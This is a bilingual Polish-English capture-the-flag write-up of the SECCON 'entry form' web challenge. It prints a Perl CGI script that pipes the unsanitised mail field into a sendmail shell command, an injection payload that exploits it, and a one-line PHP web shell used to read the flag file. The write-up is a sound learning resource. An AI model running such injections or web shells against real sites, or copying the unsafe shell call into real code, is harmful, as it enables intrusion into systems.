##entry form (web/network, 100p)

```
http://entryform.pwn.seccon.jp/register.cgi

(do not use your real mail address.)
```

###pl
[eng](#eng-version)

formularz pod podanym linkiem pozwalał nam na podanie adresu e-mail oraz nazwy użytkownika. po wysłaniu podziękował nam za podanie informacji, ale w rzeczywistości niczego nie wysyłał. krótka zabawa z modyfikacją wartości niczego nam nie dała więc postanowiliśmy się rozejrzeć. okazało się, że serwer webowy ma włączone listowanie i pod `http://entryform.pwn.seccon.jp/` znaleźliśmy dodatkowo katalog `secrets` oraz plik `register.cgi_bak`. pierwszy katalog nie był dostępny, ale drugi z plików dał nam kod źródłowy naszego formularza.

najciekawsza część wyglądała następująco:

```perl
if($q->param("mail") ne '' && $q->param("name") ne '') {
  open(sh, "|/usr/sbin/sendmail -bm '".$q->param("mail")."'");
  print sh "from: keigo.yamazaki\@seccon.jp\nto: ".$q->param("mail")."\nsubject: from seccon entry form\n\nwe received your entry.\n";
  close(sh);

  open(log, ">>log"); ### <-- flag here ###
  flock(log, 2);
  seek(log, 0, 2);
  print log "".$q->param("mail")."\t".$q->param("name")."\n";
  close(log);

  print "<h1>your entry was sent. <a href='?' style='color:#52d6eb'>go back</a></h1>";
  exit;
}
```

jest to skrypt w perlu, w którym od razu rzuca się w oczy możliwość wywołania własnego polecenia zawierając go w parametrze `mail`.

potwierdza nam to wysłanie `';ls -la;'`. według kodu źródłowego flagę mamy znaleźć w pliku `log`. niestety wygląda na to, że skrypt perlowy nie ma praw do jego odczytania. w takim razie sprawdziliśmy co znajdowało się w uprzednio niedostępnym dla nas katalogu `secrets`. znajdował się tam plik `backdoor123.php` o prostym kodzie: `<pre><?php system($_get['cmd']); ?></pre>`. wywołanie w nim polecenia `cat ../log` dało nam flagę:

`seccon{glory_will_shine_on_you.}`

### eng version

opening the provided link gave us a form asking for an e-mail and a username. after submitting it displayed a thank you message, but didn't really sent us anything. after some time playing with the values we decided to look around. it turned out that the webserver had listing enabled and going to `http://entryform.pwn.seccon.jp/` gave us a `secrets` directory and a `register.cgi_bak` file. the former wasn't available, but the latter file gave us a source code of our form.

the most interesing part was the following:

```perl
if($q->param("mail") ne '' && $q->param("name") ne '') {
  open(sh, "|/usr/sbin/sendmail -bm '".$q->param("mail")."'");
  print sh "from: keigo.yamazaki\@seccon.jp\nto: ".$q->param("mail")."\nsubject: from seccon entry form\n\nwe received your entry.\n";
  close(sh);

  open(log, ">>log"); ### <-- flag here ###
  flock(log, 2);
  seek(log, 0, 2);
  print log "".$q->param("mail")."\t".$q->param("name")."\n";
  close(log);

  print "<h1>your entry was sent. <a href='?' style='color:#52d6eb'>go back</a></h1>";
  exit;
}
```

it's a perl script and the first thing that comes to mind is the possibility of a bash command injection in the `mail` parameter.

we confirm it by sending `';ls -la;'`. according to the source code we were supposed to find the flag in the `log` file. unfortunately it seemed that the perl script didn't have a read access. in that case we tried accessing the previousely inaccessible `secrets` directory. there was a `backdoor123.php` file with a very simple source code: `<pre><?php system($_get['cmd']); ?>`. invoking a `cat ../log` gave us the flag:

`seccon{glory_will_shine_on_you.}`
